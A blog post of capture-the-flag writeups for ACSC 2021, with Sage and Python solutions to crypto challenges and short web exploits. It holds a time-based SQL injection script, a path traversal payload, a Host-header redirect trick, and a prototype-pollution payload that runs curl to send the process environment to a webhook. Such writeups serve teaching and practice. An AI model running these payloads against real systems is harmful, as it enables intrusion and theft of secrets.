---
title: ACSC 2021 writeups
date: 2021-09-19
math: true
tags: [ctf, crypto]
---

I competed in ACSC 2021 and got #16 (#2 VN). I ~~overkilled~~ did web and crypto, and here are the writeups.

## Table of Contents

1. [Crypto](#crypto)

   1.1. [RSA Stream](#rsa-stream)

   1.2. [CBCBC](#cbcbc)

   1.3. [Secret Saver](#secret-saver)

   1.4. [Swap on Curve](#swap-on-curve)

   1.5. [Two Rabin](#two-rabin)

2. [Web](#web)

   2.1. [API](#api)

   2.2. [Favorite Emojis](#favorite-emojis)

   2.3. [Cowsay as a Service](#cowsay-as-a-service)

## Crypto

The function `small_roots` below are from https://github.com/defund/coppersmith/blob/master/coppersmith.sage

### RSA Stream

We are given $m^{65537}$ and $m^{65539}$ and we need to compute $m$. Here's the firsts overkill:

- I first computed $m^2 = (\text{flag} \cdot 256^{255 - 97} + \text{pad})^2$.
- $\text{flag}$ has length $97 < \frac{256}{2}$ so I use Coppersmith to solve the equation above.

```python
from Crypto.Util.number import isPrime, bytes_to_long, long_to_bytes, inverse
from Crypto.Util.Padding import pad

n = 30004084769852356813752671105440339608383648259855991408799224369989221653141334011858388637782175392790629156827256797420595802457583565986882788667881921499468599322171673433298609987641468458633972069634856384101309327514278697390639738321868622386439249269795058985584353709739777081110979765232599757976759602245965314332404529910828253037394397471102918877473504943490285635862702543408002577628022054766664695619542702081689509713681170425764579507127909155563775027797744930354455708003402706090094588522963730499563711811899945647475596034599946875728770617584380135377604299815872040514361551864698426189453
e = 65537

f = open("chal.py", "rb").read()
ct = open("chal.enc", "rb").read()

em = []
for a in range(0, len(f), 256):
    q = f[a:a+256]
    if len(q) < 256:
        q = pad(q, 256)
    q = bytes_to_long(q)
    c = bytes_to_long(ct[a:a + 256])
    stream = c ^^ q
    em.append(stream)


flag_len = 97
m2 = em[1] * inverse(em[0], n) % n

m = b"ASCS{}"
m = pad(m, 255)
m = bytes_to_long(m)

padding = b"\0" * flag_len
padding = bytes_to_long(pad(padding, 255))

R = Integers(n)
P.<x> = PolynomialRing(R, 1)

F = (x * 256^(255 - flag_len) + padding)^2 - m2
m = small_roots(F, (256^flag_len,), m=4, d=4)[0][0]
print(long_to_bytes(m))
```

### CBCBC

It's a simple padding oracle. We can use `iv1` to recover first block, and `iv2` to recover second block and that is enough to recover the `hidden_username`.

```python
from base64 import b64encode, b64decode
from string import printable
from pwn import process, remote

with process(["python3", "chal.py"]) as tube:
# with remote("cbcbc.chal.acsc.asia", 52171) as tube:
  print(tube.recvuntil(b"=====================================================").decode())
  print(tube.recvuntil(b"3. Exit").decode())
  tube.recv()
  tube.sendline(b"1")
  tube.recv()
  tube.sendline(b"")
  tube.recvline()
  target_token = b64decode(tube.recvline().strip())

  print("Target token", target_token)

  iv1 = target_token[:16]
  iv2 = target_token[16:32]
  enc = target_token[32:]

  enc = enc[:16]
  fail_msg = b"Failed to login! Check your token again"

  def query(iv1: bytes, iv2: bytes, enc: bytes) -> bool:
    token = iv1 + iv2 + enc
    token = b64encode(token)
    tube.recvuntil(b"3. Exit")
    tube.sendline(b"2")
    tube.recv()
    tube.sendline(b"mugi")
    tube.recv()
    tube.sendline(token)
    res = tube.recvline()
    return fail_msg not in res


  ans = bytearray(b"\0" * 16)
  for i in range(15, -1, -1):
    for c in range(256):
      if chr(c ^ (16 - i)) not in printable:
        continue
      new_iv1 = bytearray(iv1)
      new_iv1[i] ^= c
      for j in range(i + 1, 16):
        new_iv1[j] ^= (16 - i) ^ ans[j]
      if query(new_iv1, iv2, enc):
        ans[i] = (c ^ (16 - i))
        break
    print(ans)
```

### Secret Saver

I remember a similar challenge from CryptoHack. The main idea is to submit the payload repeated a few times. If the payload is correct, the compressed data should have the shortest length among all the candidates. From there we can iterate over each character and get the flag.

The problem here is how to get the compressed length. I used time-based SQLi to binary search the length. For the first candidate, I search on the whole range $(0-1000)$, suppose its length is $x$, then for the rest I search on range $(x - 10, x + 10)$.

```python
import requests
from string import ascii_letters, digits

charset = [
    "_<>?!+;:.}",
    digits,
    ascii_letters,
]
charset = "".join(charset)
url = "http://167.99.77.49/"
thres = 0.3


def query(msg: str, vl = 0, vr = 1000) -> int:
    l = vl
    r = vr
    f = -1
    while l <= r:
        mid = (l + r) // 2
        res = requests.post(url, data={
            "name": f"' || (case when {str(mid).zfill(4)} <= char_length(msg) then sleep({thres}) else '' end) || '",
            "msg": msg * 20
        })
        print(res.elapsed.total_seconds())
        if res.elapsed.total_seconds() > thres:
            f = mid
            l = mid + 1
        else:
            r = mid - 1
    return f

ans = "ACSC{MAK3-CRiME-4TT4CK-GREAT-AGaiN!}"
for i in range(10):
    len_list = []
    vl = 0
    vr = 1000
    for p in range(len(charset)):
        c = charset[p]
        len_list.append(query(ans + c, vl, vr))
        print(len_list[-1], c)
        if p == 0:
            vl = len_list[-1] - 10
            vr = len_list[-1] + 10
        if len_list[-1] < len_list[0]:
            break
    min_len = min(len_list)

    for p in range(len(charset)):
        if min_len != len_list[p]:
            continue
        c = charset[p]
        ans += c
        break
    print(ans)
```

This solution took a lot of time to run and it's extremely inconsistent. Luckily the flag is easy to guess so I could know early when the code fails. Also I can edit the charset to catch the target character quicker.

After the contest, I learned of a way to use `updatexml` to throw error with query value (http://www.securityidiots.com/Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-UpdateXML.html).

### Swap on Curve

I did some simple transformations to create a univariate polynomial on $x$.

\begin{equation}
\begin{aligned}
x^2 &= y^3 + ay + b \\\\
\Leftrightarrow x^2 - b &= y^3 + ay \\\\
\Rightarrow (x^2 - b)^2 &= (y^3 + ay)^2 \\\\
\Leftrightarrow (x^2 - b)^2 &= y^6 + a^2 y^2 + 2ay^4 \\\\
\Leftrightarrow (x^2 - b)^2 &= (x^3 + ax + b)^3 + a^2 (x^3 + ax + b) + 2a(x^3 + ax + b)^2
\end{aligned}
\end{equation}

No idea how `.roots()` solved this, but it did.

```python
from Crypto.Util.number import long_to_bytes

p = 10224339405907703092027271021531545025590069329651203467716750905186360905870976608482239954157859974243721027388367833391620238905205324488863654155905507
a = 4497571717921592398955060922592201381291364158316041225609739861880668012419104521771916052114951221663782888917019515720822797673629101617287519628798278
b = 1147822627440179166862874039888124662334972701778333205963385274435770863246836847305423006003688412952676893584685957117091707234660746455918810395379096

EC = EllipticCurve(GF(p), [a, b])

P.<x> = PolynomialRing(GF(p))

Y2 = x^3 + a * x + b

F = (x^2 - b)^2 - (Y2^3 + a^2 * Y2 + 2 * a * Y2^2)

cand = []
for x, _ in F.roots():
  y2 = Y2(x)
  y = y2.sqrt()
  cand.append(x)
  cand.append(y)
  cand.append(-y)

for x in cand:
  f = long_to_bytes(int(x))
  if b"ACSC" in f:
    print(f)
```

### Two Rabin

The first part is trivial Coppersmith. For the second part, apply Coppersmith short-pad.

The code below is taken from http://mslc.ctf.su/wp/confidence-ctf-2015-rsa1-crypto-400/

```python
flag1_len = 98
n = 105663510238670420757255989578978162666434740162415948750279893317701612062865075870926559751210244886747509597507458509604874043682717453885668881354391379276091832437791327382673554621542363370695590872213882821916016679451005257003326444660295787578301365987666679013861017982035560204259777436442969488099
B = 12408624070212894491872051808326026233625878902991556747856160971787460076467522269639429595067604541456868927539680514190186916845592948405088662144279471
c1 = 47149257341850631803344907793040624016460864394802627848277699824692112650262968210121452299581667376809654259561510658416826163949830223407035750286554940980726936799838074413937433800942520987785496915219844827204556044437125649495753599550708106983195864758161432571740109614959841908745488347057154186396
c2 = 38096143360064857625836039270668052307251843760085437365614169441559213241186400206703536344838144000472263634954875924378598171294646491844012132284477949793329427432803416979432652621257006572714223359085436237334735438682570204741205174909769464683299442221434350777366303691294099640097749346031264625862
flag2_len = 98
hard_c1 = 73091191827823774495468908722773206641492423784400072752465168109870542883199959598717050676487545742986091081315652284268136739187215026022065778742525832001516743913783423994796457270286069750481789982702001563824813913547627820131760747156379815528428547155422785084878636818919308472977926622234822351389
hard_c2 = 21303605284622657693928572452692917426184397648451262767916068031147685805357948196368866787751567262515163804299565902544134567172298465831142768549321228087238170761793574794991881327590118848547031077305045920819173332543516073028600540903504720606513570298252979409711977771956104783864344110894347670094


PRxy.<x,y> = PolynomialRing(Zmod(n))
PRx.<xn> = PolynomialRing(Zmod(n))
PRZZ.<xz,yz> = PolynomialRing(Zmod(n))

g1 = x * (x + B) - hard_c1
g2 = (x + y) * (x + y + B) - hard_c2

q1 = g1.change_ring(PRZZ)
q2 = g2.change_ring(PRZZ)

h = q2.resultant(q1)
h = h.univariate_polynomial() # x is hopefully eliminated
h = h.change_ring(PRx).subs(y=xn)
h = h.monic()

print(h)

roots = h.small_roots(X=2^240, epsilon=0.02)
print(roots)
```

```python
from Crypto.Util.number import long_to_bytes

flag1_len = 98
flag1_len = 98
n = 105663510238670420757255989578978162666434740162415948750279893317701612062865075870926559751210244886747509597507458509604874043682717453885668881354391379276091832437791327382673554621542363370695590872213882821916016679451005257003326444660295787578301365987666679013861017982035560204259777436442969488099
B = 12408624070212894491872051808326026233625878902991556747856160971787460076467522269639429595067604541456868927539680514190186916845592948405088662144279471
c1 = 47149257341850631803344907793040624016460864394802627848277699824692112650262968210121452299581667376809654259561510658416826163949830223407035750286554940980726936799838074413937433800942520987785496915219844827204556044437125649495753599550708106983195864758161432571740109614959841908745488347057154186396
c2 = 38096143360064857625836039270668052307251843760085437365614169441559213241186400206703536344838144000472263634954875924378598171294646491844012132284477949793329427432803416979432652621257006572714223359085436237334735438682570204741205174909769464683299442221434350777366303691294099640097749346031264625862
flag2_len = 98
hard_c1 = 73091191827823774495468908722773206641492423784400072752465168109870542883199959598717050676487545742986091081315652284268136739187215026022065778742525832001516743913783423994796457270286069750481789982702001563824813913547627820131760747156379815528428547155422785084878636818919308472977926622234822351389
hard_c2 = 21303605284622657693928572452692917426184397648451262767916068031147685805357948196368866787751567262515163804299565902544134567172298465831142768549321228087238170761793574794991881327590118848547031077305045920819173332543516073028600540903504720606513570298252979409711977771956104783864344110894347670094

y = 105663510238670420757255989578978162666434740162415948750279893317701612062865075870926559751210244886747509597507458509604874043682717453885668881354391379276091832437791327382673554621542363370695590872213882821916016679451005257003324807101635213925825667932900258849901826251288979045274120411473033890824

R = Integers(n)
P.<x> = PolynomialRing(R)

g1 = x * (x + B) - hard_c1
g2 = (x + y) * (x + y + B) - hard_c2

while g2:
    g1, g2 = g2, g1 % g2

g1 = g1.monic()
m1 = -g1[0]
m2 = m1 + y

print(long_to_bytes(int(m2) // (2^240)))
```

## Web

### API

The server does not abort after "redirecting", so the admin code is still run. The exploit is as follow:

- Register account:

  ```
  Mugi/A123123123
  ```

- Get passcode:

  ```
  id=Mugi&pw=A123123123&c=i&c2=gp
  ```

- Get flag

  ```
  id=Mugi&pw=A123123123&c=i&c2=gd&pas=:<vNk&db=../../../../../flag
  ```

### Favorite Emojis

- First, add a query `_escaped_fragment_=1` to the URL to get to the `renderer` route.
- Second, my URL is modified to be `$host$request_uri`. `$host` is taken from the `Host` header in the HTTP request.
  - I tried `Host: api:8000` but it strips the port
  - So I ngrok a local HTTP server that contains a HTML file `test.html` that does `location = http://api:8000`. The ngrok URL does not contain a port so it isn't stripped.
- Final payload:
  ```
  GET /test.html?_escaped_fragment_=1 HTTP/1.1
  Host: f697-1-52-54-122.ngrok.io
  ```

### Cowsay as a Service

It has an obvious prototype pollution vuln. To exploit it, set username to `__proto__`, then call the `/setting` endpoint.

~~Another overkill incoming.~~

I polluted the following:

```javascript
shell = "/usr/local/bin/node";
env = {
  NODE_OPTIONS: "--require /proc/self/environ",
  payload:
    'require("child_process").execSync(\'curl -d "$(cat /proc/1/environ)" webhook\');//',
};
```

Run the `/cowsay` route and the server will execute the payload and we got the flag.

## Some 2meirl4meirl thoughts

```text
> still have an irrational fear of Java.
> could not solve the 1 non-Java challenge left.
> could not solve all the non-lattice challenges.
> what the hell is lattice?
> why do I overkill so much?
> pain
> anyway, hi Greece
```
